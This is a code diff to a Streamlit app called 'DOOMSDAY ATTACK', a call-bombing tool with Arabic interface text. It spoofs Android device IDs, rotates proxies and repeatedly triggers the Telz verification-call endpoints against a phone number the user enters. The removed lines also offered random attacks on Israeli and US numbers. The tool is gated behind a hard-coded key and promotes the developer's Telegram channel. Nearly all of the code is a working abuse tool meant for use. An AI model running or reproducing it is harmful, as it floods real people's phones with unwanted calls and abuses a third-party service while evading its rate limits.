@@ -10,20 +10,48 @@ import webbrowser
 import os
 from concurrent.futures import ThreadPoolExecutor
 
-# --- إعدادات الصفحة ---
+# --- إعدادات الصفحة وإخفاء شعارات GitHub و Streamlit ---
 st.set_page_config(page_title="DOOMSDAY ATTACK - GX3GX3", page_icon="💀", layout="wide")
 
 st.markdown("""
     <style>
+    /* إخفاء شعارات Streamlit و GitHub */
     #MainMenu {visibility: hidden;}
     footer {visibility: hidden;}
     header {visibility: hidden;}
     .stDeployButton {display:none;}
-    .main { background-color: #000000; color: #ff0000; font-family: 'Courier New', Courier, monospace; }
-    .stButton>button { width: 100%; background-color: #660000; color: white; border: 2px solid #ff0000; font-weight: bold; font-size: 20px; height: 60px; }
-    .stButton>button:hover { background-color: #ff0000; color: black; }
-    .doom-frame { border: 4px solid #ff0000; padding: 20px; border-radius: 15px; box-shadow: 0 0 30px #ff0000; margin-bottom: 25px; background-color: #0a0000; text-align: center; }
-    .stats-box { border: 2px solid #ffffff; padding: 15px; border-radius: 10px; background-color: #1a0000; text-align: center; }
+    
+    /* تصميم الواجهة المخيفة */
+    .main {
+        background-color: #000000;
+        color: #ff0000;
+        font-family: 'Courier New', Courier, monospace;
+    }
+    .stTextInput>div>div>input {
+        background-color: #0a0a0a;
+        color: #ff0000;
+        border: 2px solid #ff0000;
+        text-align: center;
+    }
+    .stButton>button {
+        width: 100%;
+        background-color: #660000;
+        color: white;
+        border: 2px solid #ff0000;
+        font-weight: bold;
+        font-size: 20px;
+    }
+    .stButton>button:hover {
+        background-color: #ff0000;
+        color: black;
+    }
+    .img-container {
+        border: 5px solid #ff0000;
+        padding: 10px;
+        background-color: #1a0000;
+        box-shadow: 0 0 20px #ff0000;
+        text-align: center;
+    }
     </style>
     """, unsafe_allow_html=True)
 
@@ -32,20 +60,32 @@ if 'authenticated' not in st.session_state:
     st.session_state.authenticated = False
 
 if not st.session_state.authenticated:
-    st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
+    st.markdown('<div class="img-container">', unsafe_allow_html=True)
     st.image("https://files.catbox.moe/3cq9i1.jpg", use_container_width=True)
     st.markdown('</div>', unsafe_allow_html=True)
-    st.markdown("<h1 style='text-align: center; color: red;'>🔒 SYSTEM LOCKED</h1>", unsafe_allow_html=True)
-    user_key = st.text_input("ENTER ACCESS KEY:", type="password")
-    if st.button("ACTIVATE SYSTEM 🔥"):
+    
+    st.markdown("<h1 style='text-align: center; color: red;'>🔒 نظام التفعيل</h1>", unsafe_allow_html=True)
+    user_key = st.text_input("أدخل المفتاح الخاص بك للوصول إلى القوة:", type="password")
+    
+    if st.button("تفعيل الأداة 🔥"):
         if user_key == "aligx3gx3":
             st.session_state.authenticated = True
             st.rerun()
         else:
-            st.error("❌ INVALID KEY!")
+            st.error("❌ المفتاح خطأ! تواصل مع المطور لتفعيل @PDD6P")
     st.stop()
 
-# --- تثبيت المكتبات تلقائياً (كما هو في كودك) ---
+# --- إذا تم التفعيل، تظهر الأداة كاملة ---
+
+# صورة البداية في إطار مخيف
+st.markdown('<div class="img-container">', unsafe_allow_html=True)
+st.image("https://files.catbox.moe/3cq9i1.jpg", use_container_width=True)
+st.markdown('</div>', unsafe_allow_html=True)
+
+st.markdown("<h1 style='text-align: center; color: #ff0000; font-size: 50px;'>هجـوم يوم القيامة</h1>", unsafe_allow_html=True)
+st.markdown("<h3 style='text-align: center; color: white;'>قناتي: gx3gx3 | المطور: @PDD6P</h3>", unsafe_allow_html=True)
+
+# --- تثبيت المكتبات تلقائياً (بدون حذف حرف واحد) ---
 def install_libs():
     libs = ['requests', 'termcolor', 'pyfiglet']
     for lib in libs:
@@ -60,7 +100,8 @@ import requests
 from termcolor import colored
 import pyfiglet
 
-# --- الدوال الأصلية بدون حذف أي حرف ---
+# رابط القناة الجديد
+CH_LINK = 'https://t.me/gx3gx3'
 
 def generate_unique_ids():
     timestamp = int(time.time() * 1000)
@@ -96,6 +137,7 @@ def load_proxies(filename="gx1gx1.txt"):
     if os.path.exists(filename):
         with open(filename, "r") as f:
             all_proxies.extend([l.strip() for l in f.read().splitlines() if l.strip()])
+    
     internal = fetch_internal_proxies()
     all_proxies.extend(internal)
     return list(set(all_proxies))
@@ -108,6 +150,7 @@ def get_working_proxy(proxies_list):
             proxy_url = f"http://{raw_proxy}"
         else:
             proxy_url = raw_proxy
+        
         proxy_dict = {"http": proxy_url, "https": proxy_url}
         if is_proxy_working(proxy_dict):
             return proxy_dict
@@ -125,40 +168,32 @@ def send_auth_call_request(url, headers, payload, proxy=None):
         return response.ok and "ok" in response.text
     except: return False
 
-# --- إدارة العدادات ---
+# إعداد العدادات
 if 'stats' not in st.session_state:
     st.session_state.stats = {"ok": 0, "error": 0}
 if 'running' not in st.session_state:
     st.session_state.running = False
 
-# --- واجهة التحكم ---
-st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
-st.image("https://files.catbox.moe/3cq9i1.jpg", use_container_width=True)
-st.markdown("<h1 style='color: #ff0000;'>هجـوم يوم القيامة</h1>", unsafe_allow_html=True)
-st.markdown('</div>', unsafe_allow_html=True)
+# واجهة الإدخال
+col1, col2 = st.columns(2)
+with col1:
+    country_code = st.text_input("🌍 كود الدولة (بدون +):", value="964")
+with col2:
+    number = st.text_input("📱 رقم الهاتف (بدون مقدمة):")
 
-attack_mode = st.radio("SELECT MODE:", ["Manual Entry", "Random Israel Attack 🇮🇱", "Random USA Attack 🇺🇸"])
+threads_count = st.slider("☣️ قوة الهجوم (Threads):", 1, 50, 15)
 
-if attack_mode == "Manual Entry":
-    col1, col2 = st.columns(2)
-    with col1: country_code = st.text_input("🌍 Country Code:", value="964")
-    with col2: number = st.text_input("📱 Phone Number:")
-else:
-    country_code = "972" if "Israel" in attack_mode else "1"
-    number = "RANDOM"
-    st.warning(f"ATTACKING {attack_mode}")
-
-threads_count = st.slider("☣️ Threads:", 1, 100, 15)
-
-def worker_task(c_code, phone_num):
+def worker_task(country_code, number):
     foreign_langs = ["en", "fr", "de", "tr", "es", "pt", "it", "ko", "ru", "ja", "zh", "ar", "hi"]
-    proxies_list = load_proxies("gx1gx1.txt")
+    proxies_list = load_proxies()
+    
     install_url = "https://api.telz.com/app/install"
     auth_call_url = "https://api.telz.com/app/auth_call"
     headers = {'User-Agent': "Telz-Android/17.5.17", 'Content-Type': "application/json"}
 
+    placeholder = st.empty()
+
     while st.session_state.running:
-        final_target = phone_num if phone_num != "RANDOM" else "".join(random.choices(string.digits, k=9))
         foxx, fox, foxer = generate_unique_ids()
         random_android_version = str(random.randint(7, 14))
         random_lang = random.choice(foreign_langs)
@@ -175,7 +210,7 @@ def worker_task(c_code, phone_num):
                 payload_auth_call = json.dumps({
                     "android_id": fox, "app_version": "17.5.17", "attempt": "0",
                     "event": "auth_call", "lang": random_lang, "os": "android",
-                    "os_version": random_android_version, "phone": f"+{c_code}{final_target}",
+                    "os_version": random_android_version, "phone": f"+{country_code}{number}",
                     "ts": foxx, "uuid": str(foxer)
                 })
                 if send_auth_call_request(auth_call_url, headers, payload_auth_call, proxy):
@@ -183,23 +218,20 @@ def worker_task(c_code, phone_num):
                 else: st.session_state.stats["error"] += 1
             else: st.session_state.stats["error"] += 1
         except: st.session_state.stats["error"] += 1
-        time.sleep(0.01)
 
-if st.button("🔥 START ATTACK"):
+        with placeholder.container():
+            st.metric("🔥 هجمات ناجحة", st.session_state.stats["ok"])
+            st.metric("💀 هجمات فاشلة", st.session_state.stats["error"])
+        time.sleep(0.05)
+
+if st.button("⚠️ بـدء الهجـوم"):
     if number:
         st.session_state.running = True
-        with ThreadPoolExecutor(max_workers=threads_count) as executor:
-            for _ in range(threads_count):
-                executor.submit(worker_task, country_code, number)
+        worker_task(country_code, number)
+    else:
+        st.error("أدخل الرقم أولاً يا وحش!")
 
-if st.button("🛑 STOP"):
+if st.button("❌ إيقاف"):
     st.session_state.running = False
-    st.rerun()
-
-# --- العدادات ---
-st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
-c1, c2 = st.columns(2)
-with c1: st.markdown(f'<div class="stats-box"><h2 style="color: #00ff00;">SUCCESS</h2><h1>{st.session_state.stats["ok"]}</h1></div>', unsafe_allow_html=True)
-with c2: st.markdown(f'<div class="stats-box"><h2 style="color: #ff0000;">FAILED</h2><h1>{st.session_state.stats["error"]}</h1></div>', unsafe_allow_html=True)
-st.markdown('</div>', unsafe_allow_html=True)
+    st.warning("تم إيقاف الهجوم.")
 
